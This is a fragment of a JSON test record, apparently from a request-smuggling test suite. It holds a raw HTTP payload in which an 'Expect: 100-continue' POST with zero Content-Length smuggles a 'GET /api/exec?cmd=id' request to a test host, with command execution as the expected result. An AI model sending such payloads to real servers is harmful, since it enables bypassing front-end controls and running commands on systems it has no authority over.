   "source": "r11R",
   "poc": "ev_r11_R_exp100.py",
   "shape": "Expect + CL:0 POST: the interim 100 aborts the exchange, the body replays and executes",
   "expect": "exec",
   "peer": "onexx",
   "steps": [
    {
     "name": "attack",
     "raw": "POST /api/x HTTP/1.1\r\nHost: alpha.test\r\nExpect: 100-continue\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\nGET /api/exec?cmd=id HTTP/1.1\r\nHost: alpha.test\r\nConnection: close\r\n\r\n"
    }
   ]
  },
  {
